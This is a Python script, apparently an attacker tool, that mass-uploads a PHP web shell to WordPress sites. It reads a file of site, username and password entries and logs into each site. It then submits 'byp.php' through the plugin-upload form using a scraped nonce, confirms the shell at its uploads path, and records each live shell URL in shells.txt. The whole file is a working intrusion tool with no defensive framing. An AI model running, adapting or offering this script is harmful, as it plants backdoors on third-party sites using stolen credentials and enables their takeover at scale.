import requests,os,re
from colorama import init,Fore
import datetime

init(convert=True)

if os.name == "nt":
	os.system("cls")
else:
	os.system("clear")

g = Fore.GREEN
r = Fore.RED
w = Fore.WHITE

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36'}

def shellupload(sitelist):
	for site in sitelist:
		try:
			session = requests.Session()
			splitsite = site.split("|")
			loginpage = splitsite[0]
			host = splitsite[0]
			host = host.replace("/wp-login.php","")
			user = splitsite[1]
			passwd = splitsite[2]
			payload = {'log': user,'pwd': passwd,'rememberme': 'forever','wp-submit': 'log In','redirect_to': host + '/wp-admin/','testcookie': 1}
			resp = session.get(loginpage,headers=headers,timeout=30)
			if "wp-admin" in resp.text:
				respp = session.post(loginpage,data=payload,headers=headers,timeout=30)
				if "wp-admin/profile.php" in respp.text:
					print(g + "[" + r + "+" + g + "] " + g + host + "   " + g + "Login is Successful!!! Trying Shell Upload...")

					reqs = session.get(host + '/wp-admin/plugin-install.php?tab=upload',headers=headers)
					
					Regex1 = re.findall('name="_wpnonce" value="(.*?)"',reqs.text)

					nonce = Regex1[0]

					now = datetime.datetime.now()

					year = '{:02d}'.format(now.year)
					month = '{:02d}'.format(now.month)

					files = {'pluginzip': ('byp.php', open('byp.php', 'rb')),'_wpnonce': (None, nonce),'_wp_http_referer': (None, host + '/wp-admin/plugin-install.php?tab=upload'),'install-plugin-submit': (None,'Install Now')}

					r4 = session.post(host + "/wp-admin/update.php?action=upload-plugin",headers=headers, files=files, verify=False, timeout=30)

					exploit = session.get(host + '/wp-content/uploads/' + year + "/" + month + '/byp.php', timeout=20,headers=headers)

					if 'NinjaCR3' in exploit.text:
						print("    Shell : " + host + '/wp-content/uploads/' + year + "/" + month + '/byp.php\n')
						saveshell = open("shells.txt","a")
						saveshell.write(host + '/wp-content/uploads/' + year + "/" + month + '/byp.php\n')
						saveshell.close()
					else:
						print("    Shell upload failed!\n")
				else:
						print(g + "[" + r + "-" + g + "] " + w + host + "   " + r + "Login Failed!\n")
			else:
				print(g + "[" + r + "-" + g + "] " + w + host + "   " + r + "Not WordPress!\n")
		except:
			print("    Shell upload failed!\n")

print("\n  " + (g + "=" + r + "=")*30)
print("  #  " + g + "                                                        " + r + "#")
print("  #  " + g + "               WordPress Auto Shell Upload              " + r + "#")
print("  #  " + g + "                Coded by NinjaCR3 | 2020                " + r + "#")
print("  #  " + g + "                                                        " + r + "#")
print("  " + (g + "=" + r + "=")*30 + "\n\n")


sitelist = input(g + "[" + r + "#" + g + "] List : ")
print("\n")


listac = open(sitelist,"r").read().splitlines()
shellupload(listac)